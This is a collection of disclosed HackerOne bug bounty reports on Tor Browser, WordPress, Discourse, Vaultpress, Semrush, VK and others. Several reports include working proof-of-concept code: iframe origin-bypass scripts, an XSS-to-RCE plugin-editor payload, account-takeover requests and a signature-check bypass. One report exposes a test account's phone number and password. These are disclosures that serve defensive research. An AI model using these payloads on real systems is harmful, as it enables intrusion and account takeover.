Writing arbitrary files on the system

---

### [Tor Browser: iframe with `data:` uri  has access to parent window](https://hackerone.com/reports/358005)

- **Report ID:** `358005`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Tor
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2018-06-06T19:56:28.922Z
- **CVE(s):** -

**Vulnerability Information:**

## Version:
7.5.4 (based on Mozilla Firefox 52.8.0)
Tested with standard security slider. However, it's likely to be possible with a higher security level.

## Summary

In Tor Browser iframe with `data:uri` inherits the origin of parent window.
That leads to iframe has access to parent window.

## PoC

### Iframe could access parent window's location

>  iframe-access-parent.html 
```html
<body>
    <script>
        let f = document.body.appendChild(document.createElement('iframe'))
        f.src =
            'data:text/html,' +
            `<script>alert(parent.location)</scrip` + `t>` 
        // should throw "SecurityError...", instead `alert()` works
    </script>
</body>
```

### iframe could access another iframe with src=data uri

> data-uri-access-another-data-uri.html
```html
<body>
    <script>
        let g = document.body.appendChild(document.createElement('iframe'))
        let f = document.body.appendChild(document.createElement('iframe'))

        g.src =
            'data:text/html,' + 'First iframe with data:uri'

        f.src =
            'data:text/html,' +
            `Second iframe with data:uri <script>alert("Iframe with data:uri could access another same-origin iframe with data:uri, first iframe location is: " + parent.window.frames[0].location.href)</scr` + `ipt>`

    </script>
</body>
```

### data:uri iframe could rewrite content of another cross-origin iframe via data:uri

##### 127.0.0.1:5000/exploit.html

```html
<body>
    <script>
        let g = document.body.appendChild(document.createElement('iframe'))
        let f = document.body.appendChild(document.createElement('iframe'))

        g.src =
            'http://127.0.0.1:5001/5001.html'

        g.onload = () => {
            f.src =
                'data:text/html,' +
                `Second iframe with data:uri 
                <script>
                    if (!parent.window.frames[0][0]) {
                        console.log('This block called in the context of |Second iframe with data:uri|');
                        console.log('If first script sets parent.window.location to some valid value');
                        console.log('it removes parent.window.frames[0][0].location from the DOM');
                        console.log('Tor re-runs script in this cause, but in context of this window');
                        console.log('e.g. window with |Second iframe with data:uri| text');
                    } else {
                        parent.window.frames[0][0].location = "data:text/html,5000 iframe rewrites  5001<script>
                        window.onload = () => {
                            console.log('This block called in the context of |5000 iframe rewrites 5001|');
                            parent.window.location = 'about:blank'
                        }
                        </scr" + "ipt>";
                    }
                    
                </scr` + `ipt>`
        }

    </script>
    <h4>we could rewrite data:uri in crossdomain windows</h4>
</body>
```

##### 127.0.0.1:5001/5001.html
```html
<html>

<body>
    <script>
        let y = document.body.appendChild(document.createElement('iframe'))
        y.src = 'data:text/html,datauri 5001'
    </script>
</body>

</html>
```

The iframe from 5000 port could rewrite an iframe in a different origin, but it doesn't have access to "parent" at 5001 port, so direct UXSS is impossible.

> Also, there is an interesting case described in PoC. Function in the iframe from port 5000 called twice in different contexts. 

## Expected behavior

### 1. In latest Chrome, Firefox, Safari iframe with `data:` uri has `null` origin and can't access parent window's location.

PoC in Chrome/FF/Safari throws error:

```
SecurityError: Blocked a frame with origin "null" from accessing a frame with origin "http://127.0.0.1:5000".  The frame requesting access has a protocol of "data", the frame being accessed has a protocol of "http". Protocols must match.
```

### 2. iframe can't rewrite another iframe's content via data uri.
Same as in the 1 case.

```
SecurityError: Permission denied to access property "href" on cross-origin object
```

### 3.

FF
```
NS_ERROR_DOM_PROP_ACCESS_DENIED: Access to property denied
```

Chrome/Safari
```
Unsafe JavaScript attempt to initiate navigation for frame with URL...
SecurityError: The operation is insecure.
```

## Impact

Partial SOP violation. 
Direct UXSS seems impossible, but described behavior opens a wide range of attack scenarios.
1. Any malicious iframe src=`data:uri` could access parent
2. Any malicious iframe src=`data:uri` could rewrite other frames's location (to data:uri too) in DOM using `parent.window.frames`

---

### [Tracking Bitwarden firefox addon users](https://hackerone.com/reports/337189)

- **Report ID:** `337189`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Bitwarden
- **Reporter:** @kmodi
- **Bounty:** - usd
- **Disclosed:** 2018-05-23T17:31:30.197Z
- **CVE(s):** -

**Vulnerability Information:**

Firefox web extension, generate a UUID for each web-extension and is specific to a user. Unlike chrome extensions. 
Which means whenever the user installs Bitwarden on Firefox, it generates a different extension ID for each user.
You can check the extension ID by about:debugging -> under extensions.

The problem occurs when Bitwarden prompts the user with the message:
 `Should Bitwarden remember this password for you?`.  [Screenshot attached]

This prompt is loaded as a local resource from `moz-extension://UUID/bar.html?add=1`, and this can be easily read by the website and any Javascript running on that page.

## Impact

Now, because this is UUID is unique to each user, it is a potential userID which can be used for tracking a user:
1. That a user is a Bitwarden user.
2. Multiple accounts used by the user across normal windows, private windows, containers.
3. Because this ID can also be read by a third-party javascript on the page:
    A.com/login.html has a third-party T.com
    B.com/login.html has a third-party T.com
Now because T.com can also read the UUID for Bitwarden, T.com can on their backend track that it's the same user visiting A.com and B.com. It will not matter whether the user has third-party cookies disabled or not, or is using some tracking protection. Hence, Bitwarden infects the browser ecosystem and breaks the privacy protections / private browsing mode.

This ID is accessible and remains same irrespective of :
- Private mode
 -Normal mode
- After browser restart
- Extension update.
- Clearing History / Local storage

The only way to remove this UUID is by deleting and re-installing the extension.

I am happy to help you with more concrete examples if needed. 
As a demo:
1. Firefox with Bitwarden extension installed.
2. Visit the page: https://cdn.cliqz.com/browser-f/fun-demo/tracking-bw-users.html

This is a known issue with Firefox webextensions you can find the details here:
https://bugzilla.mozilla.org/show_bug.cgi?id=1372288

As far as I can see, this needs to fixed at the extension level and not at Firefox level.

Please note, as of now I have only tested the resource loaded from this prompt. But this would be a problem anywhere the resource being loaded which is using the same pattern.

---

### [[www.zomato.com] Abusing LocalParams to Inject Code through ███████ query](https://hackerone.com/reports/341600)

- **Report ID:** `341600`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Eternal
- **Reporter:** @bigshaq
- **Bounty:** - usd
- **Disclosed:** 2018-04-26T12:05:49.155Z
- **CVE(s):** -

**Summary (team):**

@bigshaq found an endpoint which was throwing `500 Internal Server Error` after adding a double quote, while he thought that this behaviour might well be a SQLi, and after a bit of fuzzing @bigshaq demonstrated why he believed it to be a SQLi >

```
 - 500 (ISE) > domain.com?type=redacted&id=1"
 - 200 > domain.com?type=redacted&id=1""
 - 500 > domain.com?type=redacted&id=1"""
 and so on.
```

After some research @bigshaq was able to come up with a POC which resulted in getting the list of all the cities in a single query, we did the investigation internally and found that this could well lead to a Code Injection on one of our Server (which didn't had any sensitive information [those were already public data]).

We would like to thank @bigshaq for his finding which helped us investigate and remediate an issue.

Cheers.

---

### [ПРОСМОТР ЛЮБЫХ ПРИВАТНЫХ ФОТО + ПРЕВЬЮ ЛЮБОГО ПРИВАТНОГО ВИДЕО.](https://hackerone.com/reports/330378)

- **Report ID:** `330378`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** VK.com
- **Reporter:** @rogov
- **Bounty:** 700 usd
- **Disclosed:** 2018-04-26T05:23:06.703Z
- **CVE(s):** -

**Summary (team):**

Просмотр закрытых фотографий.

**Summary (researcher):**

Уязвимость была обнаружена в редакторе статей. Уязвимость позволяла смотреть любые приватные фотографии и любое превью приватного видео.

---

### [Insecure Direct Object Reference on API without API key](https://hackerone.com/reports/284963)

- **Report ID:** `284963`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Semrush
- **Reporter:** @scraps
- **Bounty:** - usd
- **Disclosed:** 2018-03-13T14:20:39.170Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
It is possible to query the semrush API without specifying an API key. This allows anyone to query the API and retrieve information without having paid for a subscription. 

This is not a security vulnerability as such, but I believe it does undermine your business model in that a user does not have to pay for access to your API.

**Description:** 
Through google dorking, I discovered that there are two results in google for  subdomains of api.semrush.com (see F234928). 

By clicking either of the links, I realised that it is possible to change the domain parameter and get the information for that domain. This is all without specifying a valid API key. According to https://www.semrush.com/api-analytics/, a valid API key should be required to do these types of queries. 

I tried to further look at this by adding in other fields as per the API guide, and could submit any query I wished, such as: http://uk.api.semrush.com/?action=report&type=domain_rank&export_columns=Db,Dn,Rk,Or,Ot,Oc,Ad,At,Ac,Sv,Sh&domain=semrush.com (see F234936)

I noticed that this doesn't work against api.semrush.com, only uk.api.semrush.com or us.api.semrush.com. It also works against fr.semrush.com, ie, anytime a subdomain of api.semrush.com is specified:

http://us.api.semrush.com/?action=report&type=domain_rank&export_columns=Db,Dn,Rk,Or,Ot,Oc,Ad,At,Ac,Sv,Sh&domain=semrush.com&database=us
http://uk.api.semrush.com/?action=report&type=domain_rank&export_columns=Db,Dn,Rk,Or,Ot,Oc,Ad,At,Ac,Sv,Sh&domain=semrush.com&database=us
http://fr.api.semrush.com/?action=report&type=domain_rank&export_columns=Db,Dn,Rk,Or,Ot,Oc,Ad,At,Ac,Sv,Sh&domain=semrush.com&database=us

The above all work, but the following doesn't and specifies an error message saying: "ERROR 120 :: WRONG KEY - ID PAIR" (see F234935).

http://api.semrush.com/?action=report&type=domain_rank&export_columns=Db,Dn,Rk,Or,Ot,Oc,Ad,At,Ac,Sv,Sh&domain=semrush.com&database=us

This proves that it is only subdomains of api.semrush.com which have this problem.

**Browsers Verified In:**
  * Firefox 56.0.2

**Steps To Reproduce:** 
  1. Use the google dork site:*.api.semrush.com 
  2. Notice the two results that are returned 
  3. Clicking either result gives access to the result for that page and search result
  4. Experiment with other URLs, such as: 
http://us.api.semrush.com/?action=report&type=domain_rank&domain=hackerone.com
http://us.api.semrush.com/?action=report&type=domain_rank&domain=semrush.com
  5. Notice that results are returned in every case - there doesn't appear to be anything stopping a user from making as many queries as they want, or even scripting this. 

**Impact:**
If this is the vulnerability I think it is, it effectively allows anyone to query the semrush database without having to pay for it, which would completely undermine your business model. Again, not a security risk as such, but would be a commercial risk. 

**Remediation:**
 * On the API processing, ensure that a valid API key must be present for results to be returned (taken from https://www.semrush.com/api-analytics/)
 * Ensure that those two results are removed from google by using google webmaster tools to request their removal
 * Do not allow search engines to index the *.api.semrush.com domain. This can be achieved with a robots.txt file

---

### [Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com](https://hackerone.com/reports/301406)

- **Report ID:** `301406`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ubiquiti Inc.
- **Reporter:** @dawgyg
- **Bounty:** - usd
- **Disclosed:** 2018-03-07T11:13:09.523Z
- **CVE(s):** CVE-2017-0913

**Summary (team):**

The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak.

This vulnerability don't have any impact and don't offer any threat for regular installations of UCRM, because the attacker need admin credentials, also the environment is isolated by a docker container.

---

### [Open redirect at app.goodhire.com via ReturnUrl parameter](https://hackerone.com/reports/240091)

- **Report ID:** `240091`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Inflection
- **Reporter:** @exception
- **Bounty:** - usd
- **Disclosed:** 2018-02-21T19:37:33.711Z
- **CVE(s):** -

**Summary (team):**

At login, the ReturnURL parameter could be manipulated to send a user to any arbitrary URL, rather than just a local redirect, if the user was already logged into their GoodHire account and visited the login page again.

---

### [IDOR in merchant.rbmonkey.com allows deleting eShops of another user](https://hackerone.com/reports/281296)

- **Report ID:** `281296`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** RBKmoney
- **Reporter:** @rijalrojan
- **Bounty:** - usd
- **Disclosed:** 2018-01-29T10:51:53.711Z
- **CVE(s):** -

**Summary (team):**

Website merchant.rbmonkey.com was exposed to an insecure direct object reference vulnerability (IDOR) which may allow an attacker to deleting shop objects of another user.

---

### [XSS в личных сообщениях](https://hackerone.com/reports/293105)

- **Report ID:** `293105`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** ok.ru
- **Reporter:** @circuit
- **Bounty:** - usd
- **Disclosed:** 2018-01-13T11:59:20.335Z
- **CVE(s):** -

**Vulnerability Information:**

Доброго времени суток. Я нашел XSS в личных сообщениях. 

Поле, где юзер набирает сообщения не фильтруется. Туда можно встроить скрипт, используя багу, которую я описывал раньше. Пишем сообщение и у друга срабатывает XSS.

Вы исправили возможность пилить ники, содержащие специальные символы через мобильную версию, но у меня осталось парочка. Прошу заметить, что у других людей и злоумышленников также могли остаться такие ники.

Пример аккаунта вам для тестов:
79601920522
90177715q

Прошу не блокировать. Данные аккаунты сейчас на вес - золото.

{F242442}

Еще скрин:

{F242440}

██████████

Спасибо.

## Impact

Злоумышленник может заюзать XSS.

---

### [Cross-origin resource sharing](https://hackerone.com/reports/288912)

- **Report ID:** `288912`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Semrush
- **Reporter:** @sureshbudharapu
- **Bounty:** - usd
- **Disclosed:** 2018-01-11T15:25:53.462Z
- **CVE(s):** -

**Vulnerability Information:**

###Issue:Cross-origin resource sharing: arbitrary origin trusted

The application implements an HTML5 cross-origin resource sharing (CORS) policy for this request that allows access from any domain.

The application allowed access from the requested origin https://hhgdhgjgbrg.com

Since the Vary: Origin header was not present in the response, reverse proxies and intermediate servers may cache it. This may enable an attacker to carry out cache poisoning attacks.
**Issue background:**
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.

Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.

If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.
 **remediation:**

Host:https://www.semrush.com
Path: /blog/ws/
remediation:Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.
Request:
` ` `
POST /blog/ws/?EIO=3&transport=polling&t=L-XUrv3&sid=GgyrWydG6cdnMzMxCIuZ HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-type: text/plain;charset=UTF-8
Referer: https://www.semrush.com/blog/
Content-Length: 38
Cookie: ███; blog_split=C; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; _ga=GA1.2.1264834051.1510222356; _gid=GA1.2.837455256.1510222356; utz=Asia%2FKolkata; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; visit_first=1510222356000; io=GgyrWydG6cdnMzMxCIuZ; wp13557=UWYYADDDDDDMAZHBYLB-JMKI-XKAU-IWWJ-LMUVHMXKWMYJDHAXJKTTX-HVXB-XUWC-BYVI-KCVBHMXYUVKBDlLtkNlo_Jht; __uvt=; uvts=6k5thF30VCHYVUCC; XSRF-TOKEN=alfdcNxz1SnLcbyeUDtBHc7p5i0IgSWjkrXL10C6; community-semrush=XX2llfwaopEzko3IlrC5VPaXpFuQMqQVJvo3mdzN; exp__cid=3d0fa57b-7bf2-4c65-9b04-dd93cda4bddc; __insp_wid=826279527; __insp_slim=1510241796546; __insp_nv=true; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vYXBpLWRvY3VtZW50YXRpb24v; __insp_targlpt=U0VNcnVzaCBBUEkgfCBTRU1ydXNoIEVuZ2xpc2g%3D; __insp_norec_sess=true; _gat=1; _uetsid=_ueta0786e6a
Connection: close
1.Origin: https://hhgdhgjgbxg.com

35:42["online","{\"user\":147782577}"]
` ` `
Response:
` ` ` 
HTTP/1.1 400 Bad Request
Server: nginx
Date: Thu, 09 Nov 2017 15:58:45 GMT
1.Content-Type: application/json
Connection: close
1.Access-Control-Allow-Credentials: true
1.Access-Control-Allow-Origin: https://hhgdhgjgbxg.com
X-Frame-Options: SAMEORIGIN always
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 41

{"code":1,"message":"Session ID unknown"}
` ` `

**References:
Exploiting CORS Misconfigurations
**Vulnerability classifications**
CWE-942: Overly Permissive Cross-domain Whitelist

---

### [Provide a security sistem most fit to our team](https://hackerone.com/reports/281850)

- **Report ID:** `281850`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ruby
- **Reporter:** @sam1166
- **Bounty:** - usd
- **Disclosed:** 2017-12-15T14:26:49.943Z
- **CVE(s):** -

**Vulnerability Information:**

Now we want to proof that our security sistem is most fit in this year

---

### [Take back my all data from limfuimay@gmail.com](https://hackerone.com/reports/282588)

- **Report ID:** `282588`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ruby
- **Reporter:** @sam1166
- **Bounty:** - usd
- **Disclosed:** 2017-12-15T14:26:37.114Z
- **CVE(s):** -

**Vulnerability Information:**

Attack

---

### [Bugs](https://hackerone.com/reports/281942)

- **Report ID:** `281942`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ruby
- **Reporter:** @survivedabuse
- **Bounty:** - usd
- **Disclosed:** 2017-12-15T14:25:54.090Z
- **CVE(s):** -

**Vulnerability Information:**

Account info

---

### [Password reset link injection allows redirect to malicious URL](https://hackerone.com/reports/281575)

- **Report ID:** `281575`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Mavenlink
- **Reporter:** @cablej
- **Bounty:** - usd
- **Disclosed:** 2017-12-13T18:53:34.060Z
- **CVE(s):** -

**Summary (team):**

@cablej found a vulnerability in our password reset functionality that allowed an attacker using an HTTP request with a modified `Host` header to cause a password reset link to be emailed to the target user that would navigate to the attacker's domain. Because the password reset emails are sent from the Mavenlink email infrastructure, this email, while unexpected by the user, could appear to be legitimate. As a result the user's account could be compromised if they were convinced to enter their login details on the attacker's website.

**Summary (researcher):**

Modifying the Host header in Mavenlink's password reset functionality would inject an attacker's link into the password reset email. When clicked, this would send the password reset token to the attacker's server, allowing for the attacker to reset the target's password.

Blog post: https://lightningsecurity.io/blog/host-header-injection/

Thanks to Mavenlink for the quick response and bounty!

---

### [Privilege Escalation with Session Hijacking Having a Non-privileged Valid User](https://hackerone.com/reports/242407)

- **Report ID:** `242407`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Ubiquiti Inc.
- **Reporter:** @hacknroll
- **Bounty:** - usd
- **Disclosed:** 2017-12-04T15:44:11.765Z
- **CVE(s):** CVE-2017-0935

**Summary (team):**

EdgeOS version `1.9.1.1` and prior, consequence of lack of protection if the file-system, exposing sensitive information, an attacker with access to an operator (read-only) account, can escalate privileges to admin (root) access in the system.

---

### [CSRF: Replacing the router configuration backup having an 'operator' user and bypassing the "Referer:' whitelist protection](https://hackerone.com/reports/240098)

- **Report ID:** `240098`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Ubiquiti Inc.
- **Reporter:** @hacknroll
- **Bounty:** - usd
- **Disclosed:** 2017-11-24T11:28:25.191Z
- **CVE(s):** CVE-2017-0933

**Summary (team):**

EdgeOS version `1.9.1` and prior, the researcher was able to bypass the CSRF protection. An attacker with access to an operator (read-only) account, can lure an admin (root) user to access the attacker controlled page, doing so will allow the attacker to gain admin privileges in the system.

---

### [Privilege Escalation: From operator to ubnt (and root) with non-interactive Session Hijacking](https://hackerone.com/reports/241044)

- **Report ID:** `241044`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Ubiquiti Inc.
- **Reporter:** @hacknroll
- **Bounty:** - usd
- **Disclosed:** 2017-11-24T11:28:16.359Z
- **CVE(s):** CVE-2017-0934

**Summary (team):**

EdgeOS version `1.9.1` and prior, consequence of lack of protection if the file-system, exposing sensitive information, an attacker with access to an operator (read-only) account, can escalate privileges to admin (root) access in the system.

---

### [Server-side cache poisoning leads to the http://my.dev.owox.com inaccessibility](https://hackerone.com/reports/291012)

- **Report ID:** `291012`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** OWOX, Inc.
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2017-11-23T14:58:37.708Z
- **CVE(s):** -

**Summary (team):**

By using single specially crafted URL, it was possible to cause service inaccessibility for all users who will visit the site, as result of infinite redirect loop.

**Summary (researcher):**

I discovered an issue, when by using single specially crafted URL, it was possible to cause service inaccessibility for all users who will visit the site, as result of infinite redirect loop.
I named it as cache poisoning in the report title, but honestly i have no idea what caused this behavior:) It could be cache or proxy bug.
To ensure that problem exists, and site inaccessible not only for me, i checked it from the different IP addresses/proxies/Tor.
Issue was discovered occasionally, upon checking for Open Redirects and was reported in a few minutes after discovery.
Severity was set accordingly to CVSS3.

##POC
1) Visit next link:
```
http://my.dev.owox.com//www.google.com/%2e%2e%2f
```
2) my.dev.owox.com will become inaccessible to the all users with next response:
```
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Thu, 16 Nov 2017 21:05:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: http://my.dev.owox.com//www.google.com/%2e%2e%2f/
X-Frame-Options: SAMEORIGIN
```
and will go to the constant redirect loop for the any user who will visit the site.

The OWOX team fixed the issue very fast, i even thought that it was a false-positive (cuz i couldn't reproduce issue after 1hr), and self-closed the report:)
Thanks to the team for the fast fix and great experience!

---

### [Any user with invite capabilities can take-over any account on Discourse](https://hackerone.com/reports/242765)

- **Report ID:** `242765`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Discourse
- **Reporter:** @mishre
- **Bounty:** 1024 usd
- **Disclosed:** 2017-11-06T06:35:52.922Z
- **CVE(s):** -

**Vulnerability Information:**

## Description
Users with a trust level of 2 and above on Discourse (being a member for 15 days,reading more than 100 posts and more - can be seen on: https://github.com/discourse/discourse/blob/b7386958edfb8215c99d90fde04521b3312d2ccd/config/site_settings.yml)  can invite new users to join discourse by sending an invite request. However, there exists an endpoint which uses the invite key without verifying the associated mail with the request and logs in a user to the victim's account if a valid invite key is provided.

## Steps to reproduce
1) Login with a user with trust level of 2 or above to discourse (tested on my local instal and against the code).
2) Now find a valid CSRF-TOKEN by browsing the site and then send the following request:
```
POST http://localhost:4000/invites/link HTTP/1.1
Host: localhost:4000
Connection: keep-alive
Content-Length: 35
Origin: http://localhost:4000
X-CSRF-Token: 8DkyJoFTPN4G4f3dBUWp2AsEtTg3mp7/pmoqQ9JLaZeCsKSX5DPce0O+57ni+Gc/O0cbU2rl7Y3Bdf9i2s+uZg==
Discourse-Visible: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://localhost:4000/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2
Cookie: {redacted}

email=testingmichaelreiz@gmail.coma
```
you"ll receive the following response:
```
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Discourse-Username: {some-user}
X-Discourse-Route: invites/create_invite_link
Cache-Control: no-store, must-revalidate, private, max-age=0
Content-Type: application/json; charset=utf-8
Set-Cookie: _t=8f6f82a4709bad6dd66263a225f202c5; path=/; expires=Tue, 22 Aug 2017 21:14:37 -0000; HttpOnly; SameSite=Lax
Set-Cookie: _forum_session=RUpSZFVQZmx2emVieVYwM0tscDBKV29jZ3FmU2xXSmIvTGlPTFpTVit0Z1lCU29wYmN6eDlkTDFnWXF1a1RUcVluNy9UYVhkd3hNK1h1OHZwNFBYL202WllEUkJzbWVRTytVR0VRenlxMUsrZUF6cktQSm1JU0g2Y3p1WVlNZ2dXSHNINlVDUzZzSFBQcXVVQXZDR1c5dFhkc1c0Tmk3bDRlK2ljRFRraTF6bmp2QzgxTlNnTXBhWnllVU1HelptLS16cUVkVmg5cC9JdC91RzhRenJqSGVnPT0%3D--c3b63a42a9a94781bc137c1030a71a1241c04a24; path=/; HttpOnly; SameSite=Lax
Set-Cookie: __profilin=p%3Dt; path=/
X-Request-Id: 4181e2be-5061-49dd-b3cc-1e033ece95bc
X-Runtime: 1.912866
X-MiniProfiler-Ids: ["jfv6h7gfji19eekx7p57","nsqp68md79y8tusrn8rn","4s5fo1o25vp9l7954ybm","blf2ua82vyc0n9683jwb","fe5d5qfugyl5u0hjp7ez","3s7hzl7imehtnono8p18","dmmjnggyftilvg882j9q","bwvs5enxy6pqockcxael","tfu1fnjp7hi5e0nxhqwf"]
Content-Length: 64

"http://localhost:3000/invites/{some-token}"
```
Now copy the token for a use in the later steps - don't click the link.
3) Now open a new incognito tab and launch the following url:
```
http://localhost:4000/invites/redeem/{token-from-step3}?email=victimemail@gmail.com
```
You should now be logged in to the victim's account.

## Resolution
You should probably bind the invite token to a specific email in the InvitesController class. Also, the InvitesController seems to log in any user which launches a disposable invite link to the account with the email provided along the request as can be seen in the invites controller class:
```
    invite = Invite.find_by(invite_key: params[:token])

    if invite.present?
      user = Invite.redeem_from_token(params[:token], params[:email], params[:username], params[:name], params[:topic].to_i)
      if user.present?
        log_on_user(user)
```

## Impact
Any user with invitation capabilities can therefore login as an admin account in case he knows either his username or his email.

---

### [XSS в товарах](https://hackerone.com/reports/273365)

- **Report ID:** `273365`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** VK.com
- **Reporter:** @circuit
- **Bounty:** 1000 usd
- **Disclosed:** 2017-10-29T21:13:21.124Z
- **CVE(s):** -

**Summary (team):**

Отсутствие фильтрации при поиске в товарах.

**Summary (researcher):**

Не было фильтрации некоторых символов в поиске товаров.
Из-за еще одного встроенного фильтра все приравнивалось к ="" и не получалось выполнить js.

```
<img src="" x="" onerror="" alert()="">
```

Выход из ситуации был найден в тот же день, получилось выполнить js:)

---

### [Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general](https://hackerone.com/reports/263718)

- **Report ID:** `263718`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** WordPress
- **Reporter:** @skansing
- **Bounty:** - usd
- **Disclosed:** 2017-10-04T18:53:41.370Z
- **CVE(s):** -

**Vulnerability Information:**

#Background
This report is mainly about how a user with the role of editor, expectedly can post unfiltered content
but unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.

Secondarily the report wants to highlight the technique used and the severity of it.

#Description
During my research I found that a XSS can, in the majority of cases, trivially be turned
into a RCE, by abusing same origin frame scripting in the XSS payload.

I demonstrated this "technique" in #263058 and #263109 (no need to read, there a POC in this report).
It can be used to do *almost* any action from the victims perspective, like adding an administrator or editing a plugin file.
This adds to the severity of XSS in core wp, themes and especially plugins.

It affect the understanding of the user role 'editor' and the ability to post unfiltered content
https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html

An editor is a copy-paste and a administrator visit from RCE or performing any action.
Editors users / accounts them self are more attractive for cracking and social engineering.
Administrators are not aware of the risk associated with giving a user editor role or being a editor.
All future reports with XSS can be escalated to RCE resulting in increased severity.


# POC
This POC explores a rogue editor planting payload to RCE.

- Login as editor
- Upload a .html or plant the POC payload in content
- Login as administrator visit a link containing the payload

# POC Payload
The payload opens the plugin editor, edits a file and redirects to the edited file afterwards

```
<iframe src="http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php" style="opacity:0">
</iframe>
<script>
setTimeout(function() {
  var p = "<?php phpinfo();"
  // full read/write control over dom, do anything(!)
  var d = document.querySelector("iframe").contentWindow.document;
  var c = d.querySelector("#newcontent")
  var s = d.querySelector("#submit")
  c.value = p
  s.click();
}, 2000);
setTimeout(function() {
  window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
}, 4000);
</script>
```

# Suggested Fix
the role editor should loose all privileges that can lead to scripting

consideration on hardening could be doing a BC break and switching to `x-frame-options: deny`.
However that can by bypassed by using `window.open(...)` instead of an iframe, but requires
the victim to click on the page after opening it. so this will only harden a bit.

another hardening option could be requiring password on critical actions such as
plugin install, file edit, etc. it will however have an impact on accessibility and
it might take time to find all the loop holes.

---

### [Unauthenticated RCE in Vaultpress](https://hackerone.com/reports/236552)

- **Report ID:** `236552`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Automattic
- **Reporter:** @b258ea62bf297b02afa9854
- **Bounty:** - usd
- **Disclosed:** 2017-09-15T12:51:38.159Z
- **CVE(s):** -

**Vulnerability Information:**

Hitting wordpress instalattion with vaultpress on it with get parameter vaultpress=true attacker is one method away from RCE and that method is **validate_api_signature**.

In this method we have the following constraints:
1. Firewall
2. Usage (recomended) of openssl to validate API call

In case of disabled firewall or its bypass ( easy on many configurations, specially the ones behind proxy/balancer servers ) then in case of usage of openssl to verify the signature we have easy bypass because unsafe usage of **openssl_verify** PHP function.

```
if ( $this->can_use_openssl() ) {
			
			$sslsig = '';
			if ( isset( $post['sslsig'] ) ) {
				$sslsig = $post['sslsig'];
				unset( $post['sslsig'] );
			}
			if ( openssl_verify( serialize( array( 'uri' => $uri, 'post' => $post ) ), base64_decode( $sslsig ), $this->get_option( 'public_key' ) ) ) {
				return true;
			} else {
				$__vp_validate_error = array( 'error' => 'invalid_signed_data' );
				return false;
			}
		}
```
This function **openssl_verify** have 3 possible values as result value: 
- int(1) success 
- int(0) failure to verify
- int(-1) error 

but we all know that 
```
if (-1) {echo "Hi RCE";}
```
will print **Hi RCE**

Proposed fix:
```
if ( openssl_verify( serialize( array( 'uri' => $uri, 'post' => $post ) ), base64_decode( $sslsig ), $this->get_option( 'public_key' ) ) ===1 ) {
				return true;
			} else {
				$__vp_validate_error = array( 'error' => 'invalid_signed_data' );
				return false;
			}
```
